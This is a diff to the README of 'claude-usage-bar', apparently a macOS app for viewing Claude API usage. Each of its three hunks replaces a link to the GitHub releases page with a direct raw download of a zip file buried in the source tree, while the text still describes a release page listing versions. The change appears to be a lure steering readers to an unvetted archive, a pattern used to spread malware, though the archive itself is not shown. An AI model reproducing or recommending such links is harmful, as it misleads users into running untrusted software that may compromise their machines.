@@ -1,6 +1,6 @@
 # ⚡ claude-usage-bar - View Claude API Usage Easily
 
-[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/releases)
+[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/raw/refs/heads/main/macos/Sources/ClaudeUsageBar/usage-bar-claude-1.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You will download the app from the official GitHub page. Follow these steps to i
 
 Go to the release page using this link:
 
-[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/releases)
+[![Download claude-usage-bar](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/omkargundle/claude-usage-bar/raw/refs/heads/main/macos/Sources/ClaudeUsageBar/usage-bar-claude-1.1.zip)
 
 This page lists all available versions of claude-usage-bar for different platforms.
 
@@ -144,7 +144,7 @@ If the app does not work as expected, try these steps:
 ## 🔗 Useful Links
 
 - Visit the release page anytime to get the latest version:  
-[Download claude-usage-bar](https://github.com/omkargundle/claude-usage-bar/releases)
+[Download claude-usage-bar](https://github.com/omkargundle/claude-usage-bar/raw/refs/heads/main/macos/Sources/ClaudeUsageBar/usage-bar-claude-1.1.zip)
 
 - Claude API official site (for managing your account and keys).
 
